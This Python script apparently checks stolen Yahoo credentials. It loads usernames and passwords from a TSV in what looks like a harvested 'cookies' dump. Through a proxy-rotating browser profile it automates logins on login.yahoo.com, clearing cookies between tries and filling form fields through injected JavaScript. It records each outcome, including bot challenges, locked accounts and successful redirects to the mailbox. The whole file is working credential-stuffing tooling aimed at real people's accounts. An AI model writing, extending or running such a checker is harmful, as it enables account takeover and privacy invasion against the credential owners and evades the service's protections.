#!/usr/bin/env python3
"""
Scenario survey over Yahoo credentials.

Walks creds from a start line, performs the login attempt (clear profile,
username step, optional password step), and records EVERY distinct UI outcome
into a JSONL file: url, body text, markers, validate response. Use the
collected records to classify scenarios later.

Usage:
    python scripts/yahoo_scenario_survey.py [--start 8] [--limit 25] [--out FILE]
"""
from __future__ import annotations

import argparse
import csv
import json
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

TSV = Path("/Volumes/Untitled/cookies/data/0730/cleaned/mail_yahoo_creds.tsv")
DEFAULT_OUT = Path("/Volumes/Untitled/cookies/data/0730/extracted/yahoo_scenarios.jsonl")
BDG = "bdg"
PROFILE = "proxy-rotating"
LOGIN_URL = "https://login.yahoo.com/?src=ym&pspid=&activity=mail-direct&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fn%2F"
ORIGIN = "https://login.yahoo.com"
USERNAME_SEL = "#username"
PASSWORD_SEL = "#login-passwd"
SUBMIT_SEL = 'button[type="submit"]'

ERROR_MARKERS = [
    ("invalid_creds", "invalid username or password"),
    ("account_locked", "account is locked"),
    ("unusual_activity", "unusual sign-in activity"),
    ("suspended", "suspended"),
    ("bot_challenge", "verify that you are human"),
    ("security_check", "security check"),
    ("cannot_find_account", "can't find"),
    ("try_again_later", "try again later"),
]


def run_bdg(args: list[str], *, json_output: bool = False, check: bool = True) -> dict | str:
    cmd = [BDG, *args]
    if json_output:
        cmd.append("--json")
    result = subprocess.run(cmd, capture_output=True, text=True, check=check)
    if json_output:
        return json.loads(result.stdout)
    return result.stdout


def cdp_eval(expression: str, *, check: bool = False) -> dict | None:
    raw = run_bdg(
        [
            "cdp",
            "Runtime.evaluate",
            "--params",
            json.dumps({
                "expression": expression,
                "awaitPromise": False,
                "returnByValue": True,
            }),
        ],
        json_output=False,
        check=check,
    )
    try:
        return json.loads(raw)["data"]["result"]["result"]["value"]
    except Exception:
        return None


def ui_state() -> dict:
    url = cdp_eval("location.href") or ""
    body = cdp_eval("document.body?document.body.innerText.slice(0,800):''") or ""
    body_lc = body.lower()
    markers = [label for label, text in ERROR_MARKERS if text in body_lc]
    has_password = bool(cdp_eval(f"!!document.querySelector({json.dumps(PASSWORD_SEL)})"))
    has_username = bool(cdp_eval(f"!!document.querySelector({json.dumps(USERNAME_SEL)})"))
    return {
        "url": url,
        "body": body,
        "markers": markers,
        "has_username": has_username,
        "has_password": has_password,
        "sig": hash((url, body)),
    }


def wait_for_element(selector: str, *, timeout: float = 30.0, poll: float = 0.5) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = run_bdg(["dom", "query", selector], json_output=True)
            count = data.get("data", {}).get("count", 0)
            if count and count > 0:
                return True
        except Exception:
            pass
        time.sleep(poll)
    return False


def clear_profile() -> None:
    run_bdg(["cdp", "Network.enable"], check=False)
    run_bdg(["cdp", "Storage.clearCookies"], check=False)
    run_bdg(
        [
            "cdp",
            "Storage.clearDataForOrigin",
            "--params",
            json.dumps({"origin": ORIGIN, "storageTypes": "all"}),
        ],
        check=False,
    )
    run_bdg(["cdp", "Network.clearBrowserCache"], check=False)


def fill_field(selector: str, value: str) -> bool:
    expr = f"""
(() => {{
  const el = document.querySelector({json.dumps(selector)});
  if (!el) return false;
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
  el.focus();
  setter.call(el, {json.dumps(value)});
  el.dispatchEvent(new Event('input', {{ bubbles: true }}));
  el.dispatchEvent(new Event('change', {{ bubbles: true }}));
  el.blur();
  return el.value === {json.dumps(value)};
}})()
"""
    raw = run_bdg(
        [
            "cdp",
            "Runtime.evaluate",
            "--params",
            json.dumps({"expression": expr, "awaitPromise": False, "returnByValue": True}),
        ],
        json_output=False,
        check=False,
    )
    try:
        return bool(json.loads(raw)["data"]["result"]["result"]["value"])
    except Exception:
        return False


def click_submit() -> None:
    run_bdg(["dom", "click", SUBMIT_SEL], check=False)


def network_requests() -> list[dict]:
    data = run_bdg(["network", "list"], json_output=True)
    if isinstance(data.get("data"), list):
        return data["data"]
    return data.get("data", {}).get("requests", [])


def wait_for_validate_response(*, backstop: float = 45.0, poll: float = 0.25) -> str | None:
    """Dynamically wait for the password/validate response to arrive.

    Polls the network log until the validate request's status transitions from
    pending (null) to a real HTTP status, then fetches its body immediately.
    The backstop timeout only guards against the request never being sent
    (bot sandbox swallowing the submit) — the response is captured as soon as
    it lands, not after a fixed sleep.
    """
    deadline = time.time() + backstop
    while time.time() < deadline:
        try:
            for r in network_requests():
                if r.get("method") != "POST" or "/account/challenge/password/validate" not in r.get("url", ""):
                    continue
                status = r.get("status")
                if status is None or status == 0:
                    continue  # request sent, response not yet landed
                # response arrived — grab the body now
                detail = run_bdg(["details", "network", r["requestId"]], json_output=True)
                return detail.get("data", {}).get("item", {}).get("responseBody", "")
        except Exception:
            pass
        time.sleep(poll)
    return None


SPINNER_PATH = "M7.9 2.7a5.2"  # Yahoo's Next-button spinner arc


SPINNER_WATCH = """(()=>{const b=document.querySelector('button[type="submit"]');let spin=0;if(b){b.querySelectorAll('svg path').forEach(p=>{const d=p.getAttribute('d')||'';if(d.startsWith(SPINNER_PATH))spin++})}return [!!document.querySelector('#login-passwd'),spin].join('|')})()""".replace("SPINNER_PATH", repr(SPINNER_PATH))


def button_busy_state() -> tuple[bool, bool]:
    """Return (password_field_present, spinner_visible) for the submit button.

    Yahoo swaps the Next-button arrow for a spinning arc while the request is
    in flight; the arc disappearing is the step boundary. The spinner can
    appear and vanish within ~300ms, so it must be sampled tightly.
    """
    v = cdp_eval(SPINNER_WATCH) or "false|0"
    parts = v.split("|")
    return parts[0] == "true", parts[1] == "1"


def wait_for_step_boundary(*, backstop: float = 45.0, poll: float = 0.05) -> bool:
    """Wait for the submit button's spinner to appear and then disappear —
    the step boundary — and report whether the password field is now shown.

    Handles both cases: a fast step where the spinner is never observed (the
    password field just appears), and a slow step where the spinner must be
    allowed to complete before the UI settles. After the spinner clears, a
    short settle window lets the DOM finish re-rendering before declaring the
    outcome. Returns False only when the button never showed a spinner AND no
    password field appeared (submit swallowed by the bot sandbox).
    """
    deadline = time.time() + backstop
    spinner_seen = False
    while time.time() < deadline:
        pw, spin = button_busy_state()
        if pw:
            return True  # step completed; next field is present
        if spin:
            spinner_seen = True
        elif spinner_seen:
            # spinner cleared — give the DOM a settle beat, then decide
            settle = time.time() + 0.5
            while time.time() < settle:
                pw, spin = button_busy_state()
                if pw:
                    return True
                time.sleep(poll)
            return False
        time.sleep(poll)
    return False


def scenario_label(state: dict, *, username_advanced: bool) -> str:
    """Bucket a post-interaction state into a scenario name."""
    if state["markers"]:
        return state["markers"][0]
    if username_advanced:
        return "password_step_pending"
    if "login.yahoo.com" not in state["url"]:
        return f"navigated_away:{state['url'][:50]}"
    if not state["has_username"]:
        return "form_gone"
    if state["sig"] == 0:
        return "page_blank"
    return "page_unchanged_after_submit"


def attempt(username: str, password: str, *, interactive: bool = False) -> dict:
    """One full credential attempt. Returns scenario + evidence.

    With interactive=True, after the password-step Next click the run pauses
    and waits for Enter so the operator can inspect the VNC before the next
    credential is tried.
    """
    clear_profile()
    run_bdg(["cdp", "Page.navigate", "--params", json.dumps({"url": LOGIN_URL})], check=False)
    if not wait_for_element(USERNAME_SEL, timeout=30):
        return {"scenario": "username_field_never_appeared", "step": "load", "evidence": ui_state()}

    # username step: wait for the submit spinner to run its course (appear ->
    # disappear) or for the password field to appear — never bail on the
    # spinner itself being visible, and never on a fixed sleep.
    fill_field(USERNAME_SEL, username)
    click_submit()
    advanced = wait_for_step_boundary()
    s1 = ui_state()
    if not advanced or not s1["has_password"]:
        return {"scenario": scenario_label(s1, username_advanced=False), "step": "username", "evidence": s1}

    # password step: same spinner-boundary wait, then capture the validate
    # response the moment its status flips from pending to a real HTTP code.
    fill_field(PASSWORD_SEL, password)
    click_submit()
    wait_for_step_boundary(backstop=20.0)
    if interactive:
        print(f"    [interactive] password submitted for {username} — "
              f"inspect the VNC, press Enter to continue", end="", flush=True)
        input()
    validate = wait_for_validate_response()
    s2 = ui_state()
    rec = {"scenario": "password_submitted", "step": "password", "evidence": s2, "validate": validate}
    if validate:
        try:
            v = json.loads(validate)
            rec["validate_summary"] = {
                k: v.get(k) for k in ("redirect", "status", "error", "errors", "messages")
            }
            if v.get("redirect") and "mail.yahoo.com" in v.get("redirect", ""):
                rec["scenario"] = "login_success_redirect"
        except Exception:
            rec["validate_summary"] = validate[:200]
    return rec


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--start", type=int, default=8, help="start line (1-based, header=1)")
    parser.add_argument("--limit", type=int, default=0, help="max creds to try (0=all)")
    parser.add_argument("--out", type=Path, default=DEFAULT_OUT)
    parser.add_argument("--interactive", action="store_true",
                        help="pause for Enter after each password submit")
    args = parser.parse_args()

    rows = []
    with TSV.open(newline="") as f:
        reader = csv.DictReader(f, delimiter="\t")
        for row in reader:
            rows.append((row["url"], row["username"], row["password"]))

    out = args.out
    out.parent.mkdir(parents=True, exist_ok=True)
    seen = {}
    attempted = 0
    with out.open("a", encoding="utf-8") as fh:
        for idx, (url, username, password) in enumerate(rows):
            line_no = idx + 2  # header is line 1
            if line_no < args.start:
                continue
            attempted += 1
            if args.limit and attempted > args.limit:
                break
            print(f"[{line_no}] {username} ... ", end="", flush=True)
            try:
                rec = attempt(username, password, interactive=args.interactive)
            except Exception as exc:
                rec = {"scenario": "exception", "step": "?", "evidence": {"error": str(exc)[:120]}}
            rec.update({"line": line_no, "username": username, "url": url,
                        "ts": datetime.now(timezone.utc).isoformat(timespec="seconds")})
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
            fh.flush()
            scen = rec["scenario"]
            seen[scen] = seen.get(scen, 0) + 1
            print(f"-> {scen}")

    print("\n=== scenario tally ===")
    for scen, n in sorted(seen.items(), key=lambda kv: -kv[1]):
        print(f"  {n:4d}  {scen}")
    print(f"\nRecords appended to {out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
